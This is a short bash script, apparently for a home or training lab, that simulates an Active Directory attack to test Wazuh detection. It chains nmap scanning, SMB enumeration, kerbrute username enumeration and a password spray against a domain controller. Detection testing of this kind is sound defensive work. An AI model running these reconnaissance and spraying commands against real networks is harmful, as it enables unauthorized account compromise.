#!/usr/bin/env bash
# Authorized attack simulation against YOUR OWN lab only (10.10.10.0/24). Never run against other networks.
# Run on KALI01. Each step should produce alerts in Wazuh (https://10.10.10.30).
set -u
DC=10.10.10.10
DOMAIN=ad.scheldt.lab
mkdir -p ~/evidence && cd ~/evidence

echo "[1] Network discovery and service scan"
nmap -sV -p 53,88,135,139,389,445,3389,5985 10.10.10.0/24 -oN 01-nmap.txt

echo "[2] SMB enumeration (signing, OS, shares)"
netexec smb 10.10.10.0/24 | tee 02-smb.txt

echo "[3] Username enumeration via Kerberos"
printf "administrator\nadm-t0-rayan\nlotte.peeters01\nnot.a.user\n" > users.txt
kerbrute userenum -d $DOMAIN --dc $DC users.txt | tee 03-kerbrute.txt || echo "install: sudo apt install kerbrute (or download the release)"

echo "[4] Password spray: one weak password against several users (expect event 4625 bursts)"
netexec smb $DC -u users.txt -p 'Welkom2026!' --continue-on-success | tee 04-spray.txt

echo "Done. Now check Wazuh: Threat Hunting / Security events, filter on agent DC01, rule groups authentication_failed and windows."
